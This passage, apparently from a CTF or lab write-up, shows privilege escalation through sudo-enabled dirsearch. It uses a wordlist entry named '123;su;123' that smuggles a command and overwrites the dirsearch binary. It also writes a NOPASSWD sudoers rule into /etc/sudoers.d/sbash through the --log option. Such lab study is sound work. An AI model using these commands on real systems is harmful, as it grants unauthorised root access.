我有个想法，把提权的命令写进dirsearch，再执行dirsearch不就行了吗

本地准备一个叫 `123;su;123` 的文件，用分号隔开保证su能被执行

```bash
sudo dirsearch -u http://192.168.1.142 -w ./1 -o /usr/local/bin/dirsearch
```

![image-20260224215525406](/assets/img/posts/search/image-20260224215525406.png)

```bash
sudo /usr/local/bin/dirsearch
```

![image-20260224215643139](/assets/img/posts/search/image-20260224215643139.png)

当然也可以写 `7r1umphk ALL=(ALL:ALL) NOPASSWD: ALL` 进 `/etc/sudoers.d/sbash`

有点去别的地方是要用引号和回车，要不然写入的内容会被包含在注释里

```
 sudo -u root dirsearch -w ./1 -u http://192.168.1.142/ -o
/etc/sudoers.d/sbash --format=plain --log='
7r1umphk ALL=(ALL:ALL) NOPASSWD: ALL
'
```
